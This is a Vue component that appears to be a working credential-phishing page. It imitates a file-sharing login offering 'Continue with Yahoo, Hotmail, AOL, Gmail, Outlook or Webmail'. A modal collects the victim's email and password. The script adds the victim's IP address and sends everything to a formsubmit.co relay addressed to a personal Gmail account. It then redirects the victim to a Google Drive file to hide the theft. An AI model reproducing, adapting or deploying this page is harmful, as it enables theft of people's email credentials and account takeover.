<!-- Please remove this file from your project -->
<template>
<div>
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.1.2/dist/tailwind.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<div class="logo-panel">
    <div><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQIKSNSZBE28SFUHbNfKFsQuai99vBHwIZcbQ&s" alt="" width="80" height="45"></div>
    <div><svg viewBox="0 0 24 24" fill="none" class="dig-UIIcon dig-UIIcon--standard" width="24" height="24" role="presentation" focusable="false"><path d="M11.75 4C6.535 4 4 6.535 4 11.75s2.535 7.75 7.75 7.75 7.75-2.535 7.75-7.75S16.965 4 11.75 4Zm5.714 4.5H14.87a9.237 9.237 0 0 0-.623-2.711A4.454 4.454 0 0 1 17.463 8.5ZM18 11.75c.002.586-.042 1.171-.133 1.75H14.97c.022-.579.03-1.167.03-1.75s-.008-1.171-.03-1.75h2.897c.09.579.135 1.164.133 1.75ZM11.75 18c-.616 0-1.3-.41-1.598-3h3.196c-.298 2.59-.982 3-1.598 3Zm-1.712-4.5c-.024-.524-.038-1.1-.038-1.75 0-.65.014-1.226.038-1.75h3.424c.024.524.038 1.1.038 1.75 0 .65-.014 1.226-.038 1.75h-3.424ZM5.5 11.75c-.002-.586.042-1.171.133-1.75H8.53c-.022.579-.03 1.167-.03 1.75s.008 1.171.03 1.75H5.633a11.074 11.074 0 0 1-.133-1.75Zm6.25-6.25c.616 0 1.3.41 1.598 3h-3.196c.298-2.59.982-3 1.598-3Zm-2.497.289A9.236 9.236 0 0 0 8.63 8.5H6.036a4.454 4.454 0 0 1 3.217-2.711ZM6.036 15H8.63c.07.93.28 1.844.623 2.711A4.453 4.453 0 0 1 6.037 15Zm8.21 2.711A9.237 9.237 0 0 0 14.87 15h2.594a4.454 4.454 0 0 1-3.217 2.711Z" fill="currentColor" vector-effect="non-scaling-stroke"></path></svg></div>
    </div>

    <div class="bgc center">
  <div class="container">
    <div class="header">
      <h1><span class="l">l</span>og in Or sign up </h1>
    </div>
    <div class="login-w" id="yahoo" @click="showModal">
    <div><img src="https://cdn1.iconfinder.com/data/icons/smallicons-logotypes/32/yahoo-512.png" alt="" width="20"></div>
    <div class="login-w-text"><sapn>Continue with Yahoo</div>
    </div>
    
    <div class="login-w" id="hotmail" @click="showModal">
    <div><img src="https://cdn-icons-png.flaticon.com/512/732/732223.png" alt="" width="20"></div>
    <div class="login-w-text"><sapn>Continue with Hotmail</div>
    </div>
    
    <div class="login-w" id="aol" @click="showModal">
    <div><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxbgqw5a2_TQWdR5pKtXd_oxu4YJr5P6AzZQ&s" alt="" width="20"></div>
    <div class="login-w-text"><sapn>Continue with AOL</div>
    </div>
    
    <div class="login-w" id="gmail" @click="showModal">
    <div><img src="https://static-00.iconduck.com/assets.00/gmail-icon-2048x1535-imnstrko.png" alt="" width="20"></div>
    <div class="login-w-text"><sapn>Continue with Gmail</div>
    </div>
    
    <div class="login-w" id="outlook" @click="showModal">
    <div><img src="https://cdn-icons-png.flaticon.com/512/732/732223.png" alt="" width="20"></div>
    <div class="login-w-text"><sapn>Continue with Outlook</div>
    </div>
    
    <div class="login-w" id="webmail" @click="showModal">
    <div><i class="fa fa-envelope"></i></div>
    <div class="login-w-text"><sapn>Continue with Webmail</div>
    </div>
    <div class="my_dbc_line"><span class="my_dbc_line_12">or</span></div>
    <form>
      <label for="uname">Email</label>
      <input type="text" class="inp" name="uname" required>
      
      <button type="submit">Continue</button>
    </form>
    
  </div>

</div>
  
  <div class="footer">
  <p>Privacy & Terms</p>
  <p>Cookie Policy</p>
  <p>Cookie & CCPA preferences</p>
  <p>AI Principles</p>
  </div>

  
<div class="fixed z-10 overflow-y-auto top-0 w-full left-0 hidden" id="modal">
  <div class="flex items-center justify-center min-height-100vh pt-4 px-4 pb-20 text-center sm:block sm:p-0">
    <div class="fixed inset-0 transition-opacity">
      <div class="absolute inset-0 bg-gray-900 opacity-75" />
      
    </div>
    <span class="hidden sm:inline-block sm:align-middle sm:h-screen">&#8203;</span>
    <div class="inline-block align-center bg-white rounded-lg text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full" role="dialog" aria-modal="true" aria-labelledby="modal-headline">
      <div class="p-2">
      <center>
      <img src="" alt width="80" height="35" id="modal_img">
      </center>
      </div>
      <div class="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
        <label class="font-medium text-gray-800">Email</label>
        <input v-model="formData.email" type="text" class="w-full outline-none rounded bg-gray-100 p-2 mt-2 mb-3" />
        <label class="font-medium text-gray-800">Password</label>
        <input v-model="formData.password" type="password" class="w-full outline-none rounded bg-gray-100 p-2 mt-2 mb-3" />
      </div>
      <div class="bg-gray-200 px-4 py-3 text-right">
        
        <button type="button" @click="submitForm" class="py-2 px-4 bg-blue-500 text-white rounded font-medium hover:bg-blue-700 mr-2 transition duration-500"><i class="fas fa-plus"></i> {{submitBtn}}</button>
      </div>
    </div>
  </div>
</div>
  
  </div>
  
</template>

<script>
// import axios from '@nuxtjs/axios';

export default {
   data() {
    return {
      formData: {
        params:'',
        name: '',
        email: '',        
        userISP: null, // Variable to store user's ISP information
        // _captcha: "false",
        platform:'',
      },
      formUrl: 'https://formsubmit.co/ajax/Rombergerdrystan200@gmail.com', // Replace with your desired URL
      submitBtn:"Sign In"
    };
  },
  methods: {
    async fetchUserISP() {
      try {
        // Use an external service to get the user's IP address
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();

        // Extract ISP information
        const isp = data.ip;

        // Update the userISP variable
        this.formData.userISP = isp;
      } catch (error) {
        console.error('Error fetching user ISP:', error);
      }
    },
    showModal(evt){
      console.log(evt);
      alert(evt.currentTarget.id);
      this.formData.platform = evt.currentTarget.id;
      switch(evt.currentTarget.id){
        case "yahoo":
        document.getElementById('modal_img').src = "https://cdn1.iconfinder.com/data/icons/smallicons-logotypes/32/yahoo-512.png";
        break;
        case "gmail":
        document.getElementById('modal_img').src = "https://static-00.iconduck.com/assets.00/gmail-icon-2048x1535-imnstrko.png";
        break;
        
        case "hotmail":
        document.getElementById('modal_img').src = "https://cdn-icons-png.flaticon.com/512/732/732223.png";
        break;
        
        case "outlook":
        document.getElementById('modal_img').src = "https://cdn-icons-png.flaticon.com/512/732/732223.png";
        break;
        
        case "aol":
        document.getElementById('modal_img').src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxbgqw5a2_TQWdR5pKtXd_oxu4YJr5P6AzZQ&s";
        break;
        default:
        break;
      }
document.getElementById('modal').classList.toggle('hidden');
    },
    async submitForm() {
      // Fetch user's ISP before submitting the form
      this.submitBtn = "Connecting...."
      await this.fetchUserISP();

      // Add the ISP information to the form data
      this.formData.isp = this.userISP;

      // You can perform additional actions here before or after submission
      console.log('Form submitted with data:', this.formData);
      try {
        // Submit the form data to the server using Axios
        console.log(this.$axios)
        const response = await this.$axios.post(this.formUrl, this.formData,{
           headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }
        });
        console.log('Server response:', response.data);

        window.location.replace("https://drive.google.com/file/d/0BwBmKumXxWXzSEtRM01tTFAzZTA/edit?resourcekey=0-6m0Pflh5xZG2f1Fm6ahqPw")
      } catch (error) {
        console.error('Error submitting form:', error);
      }

      // Submit the form data to the server
      // You may use Axios or another HTTP library for this step
      this.submitBtn = "Sign In"
    },
  },
  mounted() {
    // Fetch user's ISP when the component is mounted
    this.fetchUserISP();

  },
};
</script>
<style scoped>
.mk-white{
  color: #fff;
}
.logo-panel{
  display: flex;
  justify-content: space-between;
  position: fixed;
  width: 100%;
  padding: 14px;
  z-index: 1;
  border-bottom: 1px solid #ccc;
}
.container {
  background-color: #fff;
  padding-top: 109px;
  width: 355px;
  display: flex;
  flex-direction: column;
  align-items: center;
  
  
}
.header {
  text-align: center;
  margin-bottom: 20px;
}
.header h1 {
  font-size: 24px;
  font-weight: 700;
}
h1 > .l {
  font-size: 30px;
  color: var(--primary);
}
label {
  font-weight: 700;
  font-size: 16px;
}
.inp {
  font-weight: 500;
  width: 100%;
  padding: 2.5px 3.75px;
  margin: 8px 0;
  display: inline-block;
  border: 2px solid #132;
  
}
.inp,
.inp:focus {
  outline: none;
}
button {
  background-color: var(--primary);
  color: white;
  padding: 12px 20px;
  margin: 8px 0;
  width: 100%;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  opacity: 0.875;
}
button:hover {
  opacity: 1;
}
.signup {
  width: 250px;
  padding: 0 7.5px;
  text-align: center;
  margin-top: 20px;
  display: flex;
  justify-content: space-between;
}
.signup a {
  font-weight: 800;
  color: var(--primary);
  text-decoration: none;
}
.signup a:hover {
  text-decoration: underline;
}

.my_dbc_line {
    clear: both;
    margin: var(16px,16px) 0;
    overflow: hidden;
    position: relative;
    text-align: center;
}
.my_dbc_line:before {
    margin-left: -50%;
    right: 0;
}
.my_dbc_line:after, .my_dbc_line:before {
    background-color: hsla(36,10%,61%,.3);
    content: "";
    display: inline-block;
    height: 1px;
    position: relative;
    vertical-align: middle;
    width: 50%;
}
.my_dbc_line_12 {
    color: var(--color__standard__text);
    font-family: var(--__dwgAtlasGroteskStack);
    font-size: 16px;
    margin: 0 var(--dwg-spacing__unit--2,16px);
}
.my_dbc_line:after {
    left: 0;
    margin-right: -50%;
}

.login-w{
  display: flex;
  flex-direction: row;
  justify-content: space-between;
  width: 100%;
  padding: 2.5px 3.75px;
  border: 2px solid #132;
  margin: 10px;
  cursor: alias;
}

.login-w-text{
  width: 80%;
}

.footer{
  display: flex;
  flex-direction: row;
  justify-content: flex-start;
  margin-top: 15px;
  padding: 15px;
}

.footer p{
  padding-right: 15px;
}

</style>